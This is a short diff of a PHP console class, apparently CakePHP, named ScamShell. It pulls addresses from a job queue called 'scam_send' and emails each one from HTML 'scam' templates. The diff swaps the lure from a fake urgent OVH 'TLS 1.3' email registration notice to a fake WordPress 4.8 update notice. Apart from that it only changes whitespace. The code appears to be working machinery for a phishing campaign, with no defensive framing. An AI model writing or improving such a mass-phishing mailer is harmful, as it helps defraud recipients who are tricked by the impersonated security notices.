@@ -20,7 +20,7 @@ class ScamShell extends Shell
     $client = new Pheanstalk('127.0.0.1');
     $client->watch('scam_send');
 
-    while($job = $client->reserve()){
+      while($job = $client->reserve()){
       $message =json_decode($job->getData(),true);
 
           $status = $this->send($message['book']);
@@ -35,7 +35,6 @@ class ScamShell extends Shell
             $this->out('Job Burried');
 
           }
-        
     }
   }
 
@@ -44,8 +43,8 @@ class ScamShell extends Shell
          {
             $email = new Email('scam_profile');
             $email->to($content)
-            ->subject('🔐 URGENT! Enregistrez votre email OVH au service TLS 1.3')
-            ->template('scam','blank') 
+            ->subject('🔐 IMPORTANT! Mise à jour WordPress 4.8')
+            ->template('scam_wordpress','blank') 
             ->emailFormat('html')
             ->send();
               return true;
